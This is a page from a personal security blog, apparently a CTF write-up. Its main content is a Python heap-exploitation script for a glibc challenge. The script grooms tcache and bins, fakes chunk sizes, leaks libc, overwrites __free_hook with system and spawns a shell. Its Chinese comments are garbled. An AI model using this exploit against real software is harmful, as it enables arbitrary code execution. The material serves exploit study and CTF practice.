class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#æœ‰sizeé™åˆ¶ï¼Œå¯¹åº”ç´¢å¼•å¾€åç§»å³å¯</span></span><br><span class="line">add_malloc(<span class="number">0x1000</span>-<span class="number">0x290</span>+<span class="number">0x3000</span>-<span class="number">0x8</span>+<span class="number">0x3a0</span>,<span class="string">&#x27;PIG007NB&#x27;</span>)</span><br><span class="line"></span><br><span class="line">			<span class="comment">#old 			#new</span></span><br><span class="line"><span class="comment">#get layout to let chunk0_addr = 0x****3a0</span></span><br><span class="line">claim(<span class="number">0x88</span>)<span class="comment"># 0-6			#1-7</span></span><br><span class="line">claim(<span class="number">0x98</span>)<span class="comment"># 7-13			#8-14</span></span><br><span class="line">claim(<span class="number">0xa8</span>)<span class="comment"># 14-20			#15-21</span></span><br><span class="line">claim(<span class="number">0xb8</span>)<span class="comment"># 21-27			#22-28</span></span><br><span class="line">claim(<span class="number">0xc8</span>)<span class="comment"># 28-34			#29-35</span></span><br><span class="line">claim(<span class="number">0xd8</span>)<span class="comment"># 35-41			#36-42</span></span><br><span class="line">claim(<span class="number">0xe8</span>)<span class="comment"># 42-48			#43-49</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------</span></span><br><span class="line">add_malloc(<span class="number">0x98</span>,<span class="string">&#x27;\x00&#x27;</span>)<span class="comment"># 49 				#50</span></span><br><span class="line">add_malloc(<span class="number">0x98</span>,<span class="string">&#x27;\x00&#x27;</span>)<span class="comment"># 50 				#51		0x****f900</span></span><br><span class="line">add_malloc(<span class="number">0x18</span>,<span class="string">&#x27;\x00&#x27;</span>)<span class="comment"># 51  				#52 	0x****f9a0</span></span><br><span class="line">add_malloc(<span class="number">0xa8</span>,<span class="string">&#x27;\x00&#x27;</span>)<span class="comment"># 52     0 			#53		0x****f9c0</span></span><br><span class="line">add_malloc(<span class="number">0xb8</span>,<span class="string">&#x27;\x00&#x27;</span>)<span class="comment"># 53     1 			#54		0x****fa70</span></span><br><span class="line">add_malloc(<span class="number">0xd8</span>,<span class="string">&#x27;\x00&#x27;</span>)<span class="comment"># 54     2 			#55		0x****fb30</span></span><br><span class="line">add_malloc(<span class="number">0xd8</span>,<span class="string">&#x27;\x00&#x27;</span>)<span class="comment"># 55     			#56		</span></span><br><span class="line">add_malloc(<span class="number">0xe8</span>,<span class="string">&#x27;\x00&#x27;</span>)<span class="comment"># 56     3 			#57		0x****fcf0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#è¿™ä¸ª0x200å’Œ0xe0çš„è®¾ç½®æ˜¯ä¸ºäº†ä¹‹åå°†unsortedbinChunkç»™æ”¹æˆ0x200å¤‡ç”¨çš„</span></span><br><span class="line">fakeChunk_nextChunk_preSize = p64(<span class="number">0x200</span>) + p64(<span class="number">0xe0</span>)</span><br><span class="line">edit(<span class="number">57</span>,<span class="number">0x10</span>,fakeChunk_nextChunk_preSize)<span class="comment"># 56			#57</span></span><br><span class="line"></span><br><span class="line">add_malloc(<span class="number">0xe8</span>,<span class="string">&#x27;\x00&#x27;</span>)<span class="comment"># 57    4 			#58 	0x****fde0</span></span><br><span class="line">add_malloc(<span class="number">0x98</span>,<span class="string">&#x27;\x00&#x27;</span>)<span class="comment"># 58 				#59</span></span><br><span class="line">add_malloc(<span class="number">0xe8</span>,<span class="string">&#x27;\x00&#x27;</span>)<span class="comment"># 59 				#60 	0x****ff70</span></span><br><span class="line">add_malloc(<span class="number">0x18</span>,<span class="string">&#x27;\x00&#x27;</span>)<span class="comment"># 60 				#61</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#free 0~48 		#1~49</span></span><br><span class="line"><span class="comment">#-------------------------</span></span><br><span class="line"><span class="comment">#--tcache</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">7</span>):  <span class="comment">#0x88  	</span></span><br><span class="line">    free(i+<span class="number">1</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">14</span>,<span class="number">21</span>):<span class="comment">#0xa8</span></span><br><span class="line">    free(i+<span class="number">1</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">21</span>,<span class="number">28</span>):<span class="comment">#0xb8</span></span><br><span class="line">    free(i+<span class="number">1</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">35</span>,<span class="number">42</span>):<span class="comment">#0xd8</span></span><br><span class="line">    free(i+<span class="number">1</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">42</span>,<span class="number">49</span>):<span class="comment">#0xe8</span></span><br><span class="line">    free(i+<span class="number">1</span>)    </span><br><span class="line"><span class="comment">#--tcache</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">52</span>,<span class="number">57</span>): <span class="comment">#52~56  				#53~57  merge into unsortedbin</span></span><br><span class="line">    free(i+<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#---------------------------</span></span><br><span class="line"><span class="comment"># empty tcache</span></span><br><span class="line">claim(<span class="number">0x88</span>) <span class="comment">#62~68</span></span><br><span class="line">claim(<span class="number">0xa8</span>) <span class="comment">#69~75</span></span><br><span class="line">claim(<span class="number">0xb8</span>) <span class="comment">#76~82</span></span><br><span class="line">claim(<span class="number">0xd8</span>) <span class="comment">#83~89</span></span><br><span class="line">claim(<span class="number">0xe8</span>) <span class="comment">#90~96</span></span><br><span class="line"><span class="comment">#---------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#---------------------------------------------------------------- ä¸Šé¢æ˜¯ä¸€ä¸ªå¤§çš„unsorted bin</span></span><br><span class="line"><span class="comment">#è¿›è¡Œaddä¹‹åcarver up and unsortedbin è¢«æ”¾å…¥äº†largebin ä¹‹åè¿›è¡Œäº†åˆ†é…</span></span><br><span class="line">add_malloc(<span class="number">0x98</span>,<span class="string">&#x27;\x00&#x27;</span>)<span class="comment"># 52 	#97  	#0x****9c0</span></span><br><span class="line">add_malloc(<span class="number">0x98</span>,<span class="string">&#x27;\x00&#x27;</span>)<span class="comment"># 53     #98		#0x****A60</span></span><br><span class="line"></span><br><span class="line">fake_chunk_size = <span class="number">0x98</span> * <span class="string">&quot;a&quot;</span> + p16(<span class="number">0x200</span>)</span><br><span class="line"><span class="comment">#è¿™é‡Œæˆ‘å€Ÿç”¨å †æº¢å‡ºæ¥ä»¿ç…§off-by-nullï¼Œä¿®æ”¹è¿˜åœ¨largebinä¸­çš„chunkçš„sizeä»0x2e1-&gt;0x200</span></span><br><span class="line"><span class="comment">#changing largebinChunk_size will not cause abort</span></span><br><span class="line">edit(<span class="number">98</span>,<span class="number">0x98</span>+<span class="number">0x2</span>,fake_chunk_size)<span class="comment">#53 #98</span></span><br><span class="line">add_malloc(<span class="number">0x88</span>,<span class="string">&#x27;\x00&#x27;</span>)<span class="comment">#54 	#99 	#0x****B00</span></span><br><span class="line">add_malloc(<span class="number">0x88</span>,<span class="string">&#x27;\x00&#x27;</span>)<span class="comment">#55  #100 	#0x****B90</span></span><br><span class="line">add_malloc(<span class="number">0xd8</span>,<span class="string">&#x27;\x00&#x27;</span>)<span class="comment">#56  #101 	#0x****C70</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#æ„é€ preChunkçš„fdå’Œbk------------------------</span></span><br><span class="line"><span class="comment">#------tcache</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>,<span class="number">14</span>):<span class="comment">#0x98</span></span><br><span class="line">    free(i+<span class="number">1</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">7</span>):<span class="comment">#0x88</span></span><br><span class="line">    free(i+<span class="number">1</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">42</span>,<span class="number">49</span>):<span class="comment">#0xe8</span></span><br><span class="line">    free(i+<span class="number">1</span>)        </span><br><span class="line"><span class="comment">#------tcache</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">free(<span class="number">51</span>)<span class="comment">#0x98 	#50  	#51 #0x****f900</span></span><br><span class="line"><span class="comment">#let 99-&gt;fd = chunk51_addr(0x****f900)</span></span><br><span class="line">free(<span class="number">99</span>)<span class="comment">#0x88  	#54 	#99</span></span><br><span class="line"><span class="comment">#let 99-&gt;bk = chunk60_addr(0x****ff70)</span></span><br><span class="line">free(<span class="number">60</span>)<span class="comment">#0xe8 	#59 	#60 #0x****ff70</span></span><br><span class="line"><span class="comment">#æ„é€ preChunkçš„fdå’Œbk------------------------</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">free(<span class="number">98</span>)<span class="comment">#0x98 	#53 	#98</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#---------------add back</span></span><br><span class="line">claim(<span class="number">0x88</span>) <span class="comment">#102~108</span></span><br><span class="line">claim(<span class="number">0x98</span>) <span class="comment">#109~115</span></span><br><span class="line">claim(<span class="number">0xe8</span>) <span class="comment">#116~122</span></span><br><span class="line"><span class="comment">#---------------add back</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#å°†51,99,98åˆ†åˆ«æ”¾å…¥å¯¹åº”çš„smallbin,98å’Œ99ç”±äºç‰©ç†ç›¸é‚»ï¼Œæ‰€ä»¥åˆå¹¶æˆä¸º0x130çš„å—</span></span><br><span class="line"><span class="comment">#ä¹‹åä¾æ®å¤§å°é€‚é…åŸåˆ™å°†60åˆ†é…å›æ¥ç»™123</span></span><br><span class="line">add_malloc(<span class="number">0xd8</span>,<span class="string">&#x27;\x00&#x27;</span>)<span class="comment"># 0x32		#123 0x****ff70,å®é™…å¤§å°ä¸º0xf0</span></span><br><span class="line"><span class="comment">#å°†0x131çš„smallbinåˆ‡åˆ†ï¼Œæ­¤æ—¶51è¿˜åœ¨0xa0çš„smallbinä¸­ï¼Œå‰©ä¸‹0x70çš„Chunkè¿›å…¥unsortedbinä¸­</span></span><br><span class="line">add_malloc(<span class="number">0xb8</span>,<span class="string">&#x27;\x00&#x27;</span>)<span class="comment"># 0x35  		#124 0x****fa60</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">7</span>):<span class="comment">#0x88</span></span><br><span class="line">    free(i+<span class="number">1</span>)</span><br><span class="line"><span class="comment">#chunk100æ”¾å…¥unsortedbin, ä¸0x70çš„ç¢ç‰‡åˆå¹¶ï¼Œå½¢æˆ0x101çš„å—</span></span><br><span class="line">free(<span class="number">100</span>) 			<span class="comment">#55 	#100</span></span><br><span class="line"></span><br><span class="line">claim(<span class="number">0x88</span>)	<span class="comment">#125~131</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#åˆ‡å‰²0x101çš„å—ï¼Œè·å¾—0xb8å¤§å°çš„0x****fb20ï¼Œæ–¹ä¾¿ä¸0x****f900çš„å—æ”¾å…¥åŒä¸€ä¸ªunsortebinä¸­</span></span><br><span class="line">add_malloc(<span class="number">0xb8</span>,<span class="string">&#x27;\x00&#x27;</span>)<span class="comment">#0x36 	#132 	0x****fb20</span></span><br><span class="line">add_malloc(<span class="number">0x98</span>,<span class="string">&#x27;\x00&#x27;</span>)<span class="comment">#0x37  	#133	0x****f900</span></span><br><span class="line">add_malloc(<span class="number">0x38</span>,<span class="string">&#x27;\x00&#x27;</span>)<span class="comment">#0x3b 	#134 	0x****fbe0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#ä¿®å¤FD-&gt;bkå’ŒBK-&gt;fd-----------------------------</span></span><br><span class="line"><span class="comment">#------tcache</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">42</span>,<span class="number">49</span>):<span class="comment">#0xe8</span></span><br><span class="line">    free(i+<span class="number">1</span>)        </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>,<span class="number">14</span>):<span class="comment">#0x98</span></span><br><span class="line">    free(i+<span class="number">1</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">21</span>,<span class="number">28</span>):<span class="comment">#0xb8</span></span><br><span class="line">    free(i+<span class="number">1</span>)</span><br><span class="line"><span class="comment">#------tcache</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#let 133-&gt;bk = chunk132_addr(0x****f900-&gt;bk = 0x****fb20)</span></span><br><span class="line">free(<span class="number">133</span>) <span class="comment">#0x37 	#133 	0x****f900</span></span><br><span class="line">free(<span class="number">132</span>) <span class="comment">#0x36  	#132 	0x****fb20</span></span><br><span class="line"><span class="comment">#let 123-&gt;fd = chunk132_addr(0x****ff70-&gt;bk = 0x****fb20)</span></span><br><span class="line">free(<span class="number">123</span>) <span class="comment">#0x32 	#123  	0x****ff70</span></span><br><span class="line"><span class="comment">#ä¿®å¤FD-&gt;bkå’ŒBK-&gt;fd-----------------------------</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">free(<span class="number">59</span>)  <span class="comment">#58		#59		0x****fed0</span></span><br><span class="line"><span class="comment">#chunk59å’Œchunk123åˆå¹¶è¿›å…¥unsortedbinï¼Œå¤§å°0x190(0xf0+0xa0)</span></span><br><span class="line"></span><br><span class="line">claim(<span class="number">0x98</span>) 	<span class="comment">#135~141</span></span><br><span class="line">claim(<span class="number">0xb8</span>)		<span class="comment">#142~148</span></span><br><span class="line">claim(<span class="number">0xe8</span>) 	<span class="comment">#149~155</span></span><br><span class="line"></span><br><span class="line">add_malloc(<span class="number">0xc8</span>,<span class="string">&#x27;\x00&#x27;</span>)		<span class="comment">#0x32 		#156 	0x****fed0	</span></span><br><span class="line">add_malloc(<span class="number">0xb8</span>,<span class="string">&#x27;\x00&#x27;</span>)		<span class="comment">#0x36 		#157 	0x****fb20</span></span><br><span class="line">add_malloc(<span class="number">0xb8</span>,<span class="string">&#x27;\x00&#x27;</span>)		<span class="comment">#0x37  		#158	0x****ffa0</span></span><br><span class="line">add_malloc(<span class="number">0x98</span>,<span class="string">&#x27;\x00&#x27;</span>)		<span class="comment">#58  		#159 	0x****f900</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#--top_chunk</span></span><br><span class="line">add_malloc(<span class="number">0x98</span>,<span class="string">&#x27;\x00&#x27;</span>)        <span class="comment">#0x3d 			#160</span></span><br><span class="line">add_malloc(<span class="number">0x98</span>,<span class="string">&#x27;\x00&#x27;</span>)        <span class="comment">#0x3e 			#161</span></span><br><span class="line">add_malloc(<span class="number">0x18</span>,<span class="string">&#x27;\x00&#x27;</span>)        <span class="comment">#0x3f 			#162</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#------tcache</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>,<span class="number">14</span>):<span class="comment">#0x98</span></span><br><span class="line">    free(i+<span class="number">1</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">21</span>,<span class="number">28</span>):<span class="comment">#0xb8</span></span><br><span class="line">    free(i+<span class="number">1</span>)</span><br><span class="line"><span class="comment">#------tcache</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">free(<span class="number">161</span>) <span class="comment">#0x98 	#0x3e 		#161</span></span><br><span class="line">free(<span class="number">159</span>) <span class="comment">#0x98 	#58  		#159 	0x****f900</span></span><br><span class="line">free(<span class="number">157</span>) <span class="comment">#0xb8 	#0x36 		#157</span></span><br><span class="line">free(<span class="number">50</span>)  <span class="comment">#0x98 	#49 		#50 	0x****f860</span></span><br><span class="line"><span class="comment">#å…¶ä¸­159å’Œ50åˆå¹¶ä¸º0x140å¤§å°çš„å—æ”¾å…¥unsortedbinä¸­</span></span><br><span class="line"><span class="comment">#unsortedbin:0x****f860 â€”â–¸ 0x****fb20 â€”â–¸ 0x****0120</span></span><br><span class="line"></span><br><span class="line">claim(<span class="number">0xb8</span>) <span class="comment">#163~169</span></span><br><span class="line">claim(<span class="number">0x98</span>) <span class="comment">#170~176</span></span><br><span class="line"><span class="comment">#----------------------------------------------------</span></span><br><span class="line">add_malloc(<span class="number">0xb8</span>,<span class="string">&#x27;\x00&#x27;</span>) <span class="comment">#49 	#177</span></span><br><span class="line">add_malloc(<span class="number">0x98</span>,<span class="string">&#x27;\x00&#x27;</span>) <span class="comment">#0x36  	#178</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#åˆ‡å‰²0x140çš„å—</span></span><br><span class="line">add_malloc(<span class="number">0xc8</span>,<span class="string">&#x27;\x00&#x27;</span>)<span class="comment">#0x3a 	#179 	0x****f860</span></span><br><span class="line">add_malloc(<span class="number">0x68</span>,<span class="string">&#x27;\x00&#x27;</span>)<span class="comment">#0x3e   	#180 	</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">partial_null_write = <span class="number">0x98</span>*<span class="string">&#x27;b&#x27;</span></span><br><span class="line">partial_null_write += p64(<span class="number">0xf1</span>)</span><br><span class="line">edit(<span class="number">156</span>,<span class="number">0x98</span>+<span class="number">0x8</span>+<span class="number">0x1</span>,partial_null_write+<span class="string">&#x27;\x00&#x27;</span>) <span class="comment">#0x32  	#156</span></span><br><span class="line"></span><br><span class="line">partial_null_write = <span class="number">0xa8</span>*<span class="string">&#x27;c&#x27;</span></span><br><span class="line">edit(<span class="number">179</span>,<span class="number">0xa8</span>+<span class="number">0x1</span>,partial_null_write + <span class="string">&#x27;\x00&#x27;</span>) 		<span class="comment">#0x3a 		#179</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#ä¼ªé€ pre_size</span></span><br><span class="line">fake_chunk_size = <span class="number">0x98</span>*<span class="string">&#x27;d&#x27;</span></span><br><span class="line">fake_chunk_size += p64(<span class="number">0x2e1</span>)</span><br><span class="line">edit(<span class="number">124</span>,<span class="number">0x98</span>+<span class="number">0x8</span>,fake_chunk_size) 	<span class="comment">#0x35 	#124</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">42</span>,<span class="number">49</span>):<span class="comment">#0xe8</span></span><br><span class="line">    free(i+<span class="number">1</span>)    </span><br><span class="line">free(<span class="number">58</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#pull-down the unsortedbinChunk to chunk134 and leak main_arena</span></span><br><span class="line">edit(<span class="number">134</span>,<span class="number">0x8</span>,<span class="string">&quot;e&quot;</span>*<span class="number">8</span>)  <span class="comment">#0x3b #134</span></span><br><span class="line">add_malloc(<span class="number">0xd8</span>,<span class="string">&#x27;\x00&#x27;</span>) 	<span class="comment">#181</span></span><br><span class="line">show(<span class="number">134</span>)</span><br><span class="line"></span><br><span class="line">libc_base = u64Leakbase(unsortedBinIdx + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>] + <span class="number">0x10</span>)</span><br><span class="line">lg(<span class="string">&#x27;libc_base&#x27;</span>,libc_base)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#---------------------------------------------------------------------------------</span></span><br><span class="line">claim(<span class="number">0xe8</span>) 	<span class="comment">#182~188</span></span><br><span class="line">add_malloc(<span class="number">0xe8</span>,<span class="string">&#x27;\x00&#x27;</span>)		<span class="comment">#0x40 	#189</span></span><br><span class="line">free(<span class="number">44</span>) 	<span class="comment">#0x2b 	#44</span></span><br><span class="line">free(<span class="number">134</span>) 	<span class="comment">#0x3b 	#134</span></span><br><span class="line">edit(<span class="number">189</span>,<span class="number">0x8</span>,p64(libc_base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]-<span class="number">8</span>)) 	<span class="comment">#0x40 	#189</span></span><br><span class="line">add_malloc(<span class="number">0xe8</span>,<span class="string">&#x27;\x00&#x27;</span>)  		<span class="comment">#190</span></span><br><span class="line">add_malloc(<span class="number">0xe8</span>,<span class="string">&#x27;\x00&#x27;</span>) 		<span class="comment">#191</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">191</span>,<span class="number">0x10</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>+p64(libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>])) 	<span class="comment">#191</span></span><br><span class="line">free(<span class="number">191</span>)</span><br><span class="line">it()</span><br><span class="line"><span class="comment">#--------------------------------------------------------------</span></span><br></pre></td></tr></table></div></figure>

</div></div></article></section><nav class="paginator"><div class="paginator-inner"><a class="extend prev" rel="prev" href="/page/3/"><i class="fas fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/3/">3</a><span class="page-number current">4</span><a class="page-number" href="/page/5/">5</a><span class="space">&hellip;</span><a class="page-number" href="/page/14/">14</a><a class="extend next" rel="next" href="/page/5/"><i class="fas fa-angle-right"></i></a></div></nav></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><section class="sidebar-toc hide"></section><!-- ov = overview--><section class="sidebar-ov"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsauthor.jpg" alt="avatar"></div><p class="sidebar-ov-author__text">The way forward</p></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">134</div><div class="sidebar-ov-state-item__name">Archives</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--categories" href="/categories/"><div class="sidebar-ov-state-item__count">86</div><div class="sidebar-ov-state-item__name">Categories</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--tags" href="/tags/"><div class="sidebar-ov-state-item__count">75</div><div class="sidebar-ov-state-item__name">Tags</div></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener" data-popover="Creative Commons" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright Â© 2023</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>PIG-007</span></div><div><span>Powered by <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a></span><span> v5.4.0</span><span class="footer__devider">|</span><span>Theme - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span><span> v2.6.2</span></div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><div class="search-mask"></div><div class="search-popup"><span class="search-close"></span><div class="search-input"><input placeholder="Search for Posts (Support multiple keywords)"></div><div class="search-results"></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script>function initSearch() {
  var isXML = true;
  var search_path = 'search.json';

  if (!search_path) {
    search_path = 'search.xml';
  } else if (/json$/i.test(search_path)) {
    isXML = false;
  }

  var path = '/' + search_path;
  $.ajax({
    url: path,
    dataType: isXML ? 'xml' : 'json',
    async: true,
    success: function (res) {
      var datas = isXML ? $('entry', res).map(function () {
        // å°† XML è½¬ä¸º JSON
        return {
          title: $('title', this).text(),
          content: $('content', this).text(),
          url: $('url', this).text()
        };
      }).get() : res;
      var $input = $('.search-input input');
      var $result = $('.search-results');
      // æœç´¢å¯¹è±¡ï¼ˆæ ‡é¢˜ã€å†…å®¹ï¼‰çš„æƒé‡ï¼Œå½±å“æ˜¾ç¤ºé¡ºåº
      var WEIGHT = { title: 100, content: 1 };
      var searchPost = function () {
        var searchText = $input.val().toLowerCase().trim();
        // æ ¹æ®ç©ºç™½å­—ç¬¦åˆ†éš”å…³é”®å­—
        var keywords = searchText.split(/[\s]+/);
        // æœç´¢ç»“æœ
        var matchPosts = [];

        // æœ‰å¤šä¸ªå…³é”®å­—æ—¶ï¼Œå°†åŸæ–‡å­—æ•´ä¸ªä¿å­˜ä¸‹æ¥
        if (keywords.length > 1) {
          keywords.push(searchText);
        }
        // é˜²æ­¢æœªè¾“å…¥å­—ç¬¦æ—¶æœç´¢
        if (searchText.length > 0) {
          datas.forEach(function (data) {
            var isMatch  = false;
            // æ²¡æœ‰æ ‡é¢˜çš„æ–‡ç« ä½¿ç”¨é¢„è®¾çš„ i18n å˜é‡ä»£æ›¿
            var title = (data.title && data.title.trim()) || '[ Untitled ]';
            var titleLower = title && title.toLowerCase();
            // åˆ é™¤ HTML æ ‡ç­¾ å’Œ æ‰€æœ‰ç©ºç™½å­—ç¬¦
            var content = data.content && data.content.replace(/<[^>]+>/g, '');
            var contentLower = content && content.toLowerCase();
            // åˆ é™¤é‡å¤çš„ /
            var postURL = data.url && decodeURI(data.url).replace(/\/{2,}/g, '/');
            // æ ‡é¢˜ä¸­åŒ¹é…åˆ°çš„å…³é”®è¯
            var titleHitSlice = [];
            // å†…å®¹ä¸­åŒ¹é…åˆ°çš„å…³é”®è¯
            var contentHitSlice = [];

            keywords.forEach(function (keyword) {
              /**
              * è·å–åŒ¹é…çš„å…³é”®è¯çš„ç´¢å¼•
              * @param {String} keyword è¦åŒ¹é…çš„å…³é”®å­—
              * @param {String} text åŸæ–‡å­—
              * @param {Boolean} caseSensitive æ˜¯å¦åŒºåˆ†å¤§å°å†™
              * @param {Number} weight åŒ¹é…å¯¹è±¡çš„æƒé‡ã€‚æƒé‡å¤§çš„ä¼˜å…ˆæ˜¾ç¤º
              * @return {Array}
              */
              function getIndexByword (word, text, caseSensitive, weight) {
                if (!word || !text) {
                  return [];
                };

                var startIndex = 0; // æ¯æ¬¡åŒ¹é…çš„å¼€å§‹ç´¢å¼•
                var index = -1;     // åŒ¹é…åˆ°çš„ç´¢å¼•å€¼
                var result = [];    // åŒ¹é…ç»“æœ

                if (!caseSensitive) {
                  word = word.toLowerCase();
                  text = text.toLowerCase();
                }

                while((index = text.indexOf(word, startIndex)) !== -1) {
                  var hasMatch = false;
                  // ç´¢å¼•ä½ç½®ç›¸åŒçš„å…³é”®è¯ï¼Œä¿ç•™é•¿åº¦è¾ƒé•¿çš„
                  titleHitSlice.forEach(function (hit) {
                    if (hit.index === index && hit.word.length < word.length) {
                      hit.word = word;
                      hasMatch = true;
                    }
                  });
                  startIndex = index + word.length;
                  !hasMatch && result.push({ index: index, word: word, weight: weight });
                }
                return result;
              }
              titleHitSlice = titleHitSlice.concat(getIndexByword(keyword, titleLower, false, WEIGHT.title));
              contentHitSlice = contentHitSlice.concat(getIndexByword(keyword, contentLower, false, WEIGHT.content));
            });

            var hitTitle = titleHitSlice.length;
            var hitContent = contentHitSlice.length;

            if (hitTitle > 0 || hitContent > 0) {
              isMatch = true;
            }
            if (isMatch) {
              ;[titleHitSlice, contentHitSlice].forEach(function (hit) {
                // æŒ‰ç…§åŒ¹é…æ–‡å­—çš„ç´¢å¼•çš„é€’å¢é¡ºåºæ’åº
                hit.sort(function (left, right) {
                  return left.index - right.index;
                });
              });
              /**
              * ç»™æ–‡æœ¬ä¸­åŒ¹é…åˆ°çš„å…³é”®è¯æ·»åŠ æ ‡è®°ï¼Œä»è€Œè¿›è¡Œé«˜äº®æ˜¾ç¤º
              * @param {String} text åŸæ–‡æœ¬
              * @param {Array} hitSlice åŒ¹é…é¡¹çš„ç´¢å¼•ä¿¡æ¯
